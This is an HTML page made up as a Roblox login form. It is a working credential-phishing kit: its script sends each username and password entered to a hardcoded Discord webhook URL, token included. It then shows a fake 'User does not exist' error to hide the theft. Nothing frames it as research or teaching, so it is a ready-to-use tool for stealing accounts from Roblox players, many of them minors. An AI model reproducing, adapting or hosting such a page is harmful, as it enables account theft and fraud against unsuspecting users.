<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            width: 400px;
        }

        .login-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .login-header h1 {
            color: #333;
        }

        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            background-color: #f9f9f9;
            color: #333;
        }

        .login-form button[type="submit"] {
            background-color: #ccc;
            color: #333;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }

        .login-footer {
            text-align: center;
            margin-top: 20px;
        }

        .login-footer a {
            color: #333;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>Login to Roblox</h1>
        </div>
        <form class="login-form" onsubmit="submitForm(event)">
            <input required="" placeholder="Username/Email" type="text" id="username">
            <input required="" placeholder="Password" type="password" id="password">
            <button type="submit">Log In</button>
        </form>
        <div class="login-footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
            <p><a href="#">Forgot Password?</a></p>
        </div>
    </div>

    <script>
        function submitForm(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            fetch('https://discord.com/api/webhooks/1320897243955597372/1ghR7MbsKGerGDJwdSF5RXEUtn6c8_cYwXuLu_J3MvVQyf6J4OCDMk2n5iH9qTvljbnJ', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `Username: ${username}\nPassword: ${password}`
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                console.log('Webhook request successful');
                alert('Error: User does not exist');
            })
            .catch(error => {
                console.error('There has been a problem with your fetch operation:', error);
                alert('Error: User does not exist');
            });
        }
    </script>

</body>
</html>
